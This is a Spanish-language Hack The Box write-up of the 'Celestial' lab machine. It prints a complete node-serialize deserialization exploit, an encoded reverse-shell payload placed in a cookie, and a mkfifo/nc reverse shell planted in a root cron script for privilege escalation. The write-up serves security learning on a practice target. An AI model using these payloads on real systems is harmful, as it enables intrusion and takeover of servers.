---
title: Hack The Box Celestial
author: k4miyo
date: 2022-03-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [JavaScript, File Misconfiguration]
ping: true
---

## Celestial
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.85.

```bash
❯ ping -c 1 10.10.10.85
PING 10.10.10.85 (10.10.10.85) 56(84) bytes of data.
64 bytes from 10.10.10.85: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.10.85 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.435/137.435/137.435/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.85 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 13:33 CST
Initiating Ping Scan at 13:33
Scanning 10.10.10.85 [4 ports]
Completed Ping Scan at 13:33, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:33
Scanning 10.10.10.85 [65535 ports]
Discovered open port 3000/tcp on 10.10.10.85
Completed SYN Stealth Scan at 13:34, 45.26s elapsed (65535 total ports)
Nmap scan report for 10.10.10.85
Host is up (0.14s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 45.55 seconds
           Raw packets sent: 83595 (3.678MB) | Rcvd: 82630 (3.305MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 115 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.85
   5   │     [*] Open ports: 3000
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p3000 10.10.10.85 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 13:35 CST
Nmap scan report for 10.10.10.85
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.01 seconds
```

Vemos que se encuentra abierto el puerto 3000 y se encuentra asociado al servicio ***Node.js Express framework***, del cual si quieremos saber más, podemos consultar el sitio oficial [expressjs](https://expressjs.com/es/). Ahora vamos a buscar si existen exploits públicos que nos ayuden a vulnerar el sitio y encontramos un documento en pdf [41289-exploiting-node.js-deserialization-bug-for-remote-code-execution](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf) del cual no vamos a basar para vulnerar la máquina, incluso montarnos nuestro servidor en local para realizar pruebas.

Para montarnos nuestro servicio, de acuerdo con lo que nos dice el documento, necesitamos crear el recurso **node.js** con el siguiente contenido.

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) {
  if (req.cookies.profile) {
    var str = new Buffer(req.cookies.profile,'base64').toString();
    var obj = serialize.unserialize(str);
    if (obj.username) {
      res.send("Hello " + escape(obj.username));
    }
  } else {
    res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
  }
  res.send("Hello World");
});
app.listen(3000);

```

Debemos tener instalados los siguiente paquetes:

```bash
❯ apt-get install npm
❯ npm install node-serialize
❯ npm install express
❯ npm install cookie-parser
```

Ejecutamos nuestro archivo y tratamos de acceder vía web.

```bash
❯ node node.js


```

![""](/assets/images/htb-celestial/celestial-web.png)

Si vemos el código del archivo que creamos **node.js**, vemos una cookie en donde se observa una cadena en base 64; vamos a tratar de ver el contenido.

```bash
❯ echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" | base64 -d; echo
{"username":"ajin","country":"india","city":"bangalore"}
```

Vemos que se tienen datos de forma serializada en donde el campo **username** se observa el dato **ajin**, el mismo que vemos vía web. 

![""](/assets/images/htb-celestial/celestial-web1.png)

Leyendo el documento, nos proporciona una función para serializar los datos.

```js
var y = {
rce : function(){
  require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });
  },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Lo ejecutamos:

```bash
❯ node serialize.js
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\n  require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });\n  }"}
```

Nos arroja los datos serializados (parcialmente, ya que contiene `\n` que hay que eliminar). Sin embargo, no vemos que nos aplique comandos a nivel de sistema. Continuando leyendo, el autor nos dice que al final de body, al agregar **()**, logramos que se ejecute el comando, para este caso es `ls -l`:

```js
var y = {
rce : function(){
  require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });
  }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

```bash
❯ node serialize.js
Serialized: 
{}
bin
boot
dev
etc
home
initrd.img
initrd.img.old
keybase
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sandbox
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
zsh
```

Tenemos ejecución de comandos a nivel de sistema. Por lo tanto, debemos crear el archivo **unserialize.js** para ver el efecto que tendría de lado del servidor (víctima):

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr) { console.log(stdout)});}()"}';
serialize.unserialize(payload);
```

Al ejecutarlo, vemos lo mismo que el resultado anterior, sin embargo, debemos tener en cuenta que el contenido **unserialize.js** sería similar al que se tiene del lado del servidor y que logramos ejecución de comandos a nivel de sistema. Para trabajar más cómodos, el autor del documento, nos proporciona un script en python para obtener una reverse shell:

```bash
❯ wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
--2022-03-16 23:21:49--  https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1575 (1.5K) [text/plain]
Grabando a: «nodejsshell.py»

nodejsshell.py                   100%[=======================================================>]   1.54K  --.-KB/s    en 0s      

2022-03-16 23:21:49 (18.3 MB/s) - «nodejsshell.py» guardado [1575/1575]
❯ python2 nodejsshell.py
Usage: nodejsshell.py <LHOST> <LPORT>
```

Lo ejecutamos con los valores que nos solicita:

```bash
❯ python2 nodejsshell.py 10.10.14.27 443
[+] LHOST = 10.10.14.27
[+] LPORT = 443
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,50,55,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Copiamos el resultado que nos arroja y lo pegamos en el recurso **unserialize.js**

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,50,55,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}';
serialize.unserialize(payload);

```

Lo ejecutamos y nos ponemos en escucha por el puerto 443:

```bash
❯ node unserialize.js


```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.14.27] 34424
Connected!
whoami
root
```

Hemos logrado obtener una conexión (de nosotros mismos). Ahora con el concepto en mente, vamos a hacerlo en la máquina víctima; por lo tanto vamos quedarnos con la siguiente cadena de texto:

```bash
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,50,55,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Ciframos la cadena en base 64:

```bash
❯ cat data.txt | base64 -w 0
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNDgsNDYsNDksNDgsNDYsNDksNTIsNDYsNTAsNTUsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNTIsNTIsNTEsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0K
```

Copiamos el resultado, ingresamos al sitio web de la máquina víctima `http://10.10.10.85:3000/` y con el plugin **Edit this cookie** cambiamos el valor de la cookie por lo que copiamos.

![""](/assets/images/htb-celestial/celestial-web2.png)

Antes de recargar la página, nos ponemos en escucha por el puerto 443.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.85] 53454
Connected!
whoami
sun
```

Ya nos encontramos dentro de la máquina como el usuario **sun** y antes de todo, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos y ya podemos visualizar la flag (user.txt). Ahora vamos a ver una forma de escalar privilegios:

```bash
sun@sun:~/Documents$ id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
sun@sun:~/Documents$ sudo -l
[sudo] password for sun: 
sun@sun:~/Documents$ cd /
sun@sun:/$ find \-perm -4000 2>/dev/null
./usr/lib/eject/dmcrypt-get-device
./usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/sbin/pppd
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/sudo
./usr/bin/ubuntu-core-launcher
./usr/bin/gpasswd
./usr/bin/passwd
./bin/mount
./bin/ping6
./bin/ntfs-3g
./bin/umount
./bin/fusermount
./bin/ping
./bin/su
sun@sun:/$
```

Podríamos aprovechar el binario `/usr/bin/pkexec`; sin embargo, vamos a hacerlo de la forma que fue pensada la máquina. Vamos a listan procesos en el sistema que se ejecuten en intervalos regulares y lo haremos con nuestro archivo [[ProcMon]]:

```bash
sun@sun:/dev/shm$ chmod +x procmon.sh 
sun@sun:/dev/shm$ ./procmon.sh 
< [kworker/0:0]
> /usr/sbin/CRON -f
> /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
< /usr/sbin/CRON -f
< /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
^C
sun@sun:/dev/shm$
```

Vemos que se está ejecutando el script en python `/home/sun/Documents/script.py` el cual se encuentra en nuestro directorio y a parte, tenemos terminos de escritura. Si pensamos que el usuario **root**, podríamos editar el archivo para obtener una shell.

```bash
sun@sun:/dev/shm$ cd /home/sun/Documents/
sun@sun:~/Documents$ ls -l
total 8
-rw-rw-r-- 1 sun sun 29 Sep 21  2017 script.py
-rw-rw-r-- 1 sun sun 33 Sep 21  2017 user.txt
sun@sun:~/Documents$
```

Modificamos el archivo para 

```bash
sun@sun:~/Documents$ cat script.py 
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4443 >/tmp/f")
sun@sun:~/Documents$
```

Nos ponemos en escucha por el puerto 4443 (cambiamos el puerto debido a que si nos ponemos por el puerto 443 seguiremos recibiendo la conexión del usuario **sun**) y esperamos a que la tarea se ejecute:

```bash
❯ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.85] 60234
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

Ya nos encontramos en la máquina como el usuario **root** y podemos visualizar la flag (root.txt).
